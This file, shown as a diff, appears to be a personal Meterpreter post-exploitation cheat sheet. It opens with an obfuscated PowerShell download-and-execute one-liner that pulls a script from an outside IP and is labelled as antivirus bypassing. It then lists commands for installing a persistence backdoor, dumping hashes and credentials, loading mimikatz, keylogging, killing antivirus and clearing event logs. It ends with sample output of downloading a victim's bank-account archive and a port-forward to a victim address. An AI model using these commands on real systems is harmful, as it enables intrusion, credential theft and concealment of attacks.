@@ -1,0 +1,67 @@
+METERPRETER
+Turning Meterpreter into PowerShell  
+
+post/windows/manage/payload_inject  
+
+windows exec payload example with AV bypassing payload
+
+powershell.exe "(New-Object Net.WebClient).(((((New-Object Net.WebClient)).PsObject.Methods)|Where-Object{$_.Name-ilike'*nl*g'}).Name).Invoke('http://74.134.249.8/test.ps1') | IEX"
+
+**To keep shell from dying -- set all multi handler options, before actually running the multi-handler, type the following for persistence
+
+exec cmd.exe -f -h
+
+set autorunscript explorer.exe
+
+set autorunscript migrate -f
+
+run post/windows/manage/migrate 
+
+run persistence  <--for a back door
+
+run post/windows/gather/credentials/gpp  <--get group policy creds
+
+run getgui <--enable rdp
+
+clearev <--clear event log
+
+run post/windows/capture/keylog_recorder  <--record keystrokes
+
+run killav <-- kill anti virus
+
+run vnc <-- get a gui :)
+
+run hashdump <--dump system hashes
+
+run post/windows/gather/dumplinks  <---gather link files that may be useful
+
+run post/windows/gather/enum_applications  <--enumerate applications
+
+load mimikatz  <----- load mimikatz function (IE password dumps etc)
+
+getsystem <------escalate privs
+
+run post/windows/gather/credentials/mssql_local_hashdump  <--dump database
+
+run winenum    <----enumerate system in meterpreter (files get stored in .msf4 or .msf8)
+
+run post/windows/gather/win_privs <---check if you are an admin
+
+run post/multi/recon/local_exploit_suggester  <----check for privilege escalation
+
+run post/windows/gather/credentials/credential_collector
+
+run post/windows/gather/enum_ms_product_keys
+
+execute -f cmd.exe -i -H  <-----run commands in meterpreter
+
+meterpreter > download C:\\bank-account.zip /root/Desktop/bank-account.zip
+[*] downloading: C:\bank-account.zip -> /root/Desktop/bank-account.zip
+[*] download   : C:\bank-account.zip -> /root/Desktop/bank-account.zip
+
+portfwd add -l 1234 -p 445 -r 10.11.1.14
+             my port | their port - the ip address is the victim IP
+
+
+
+
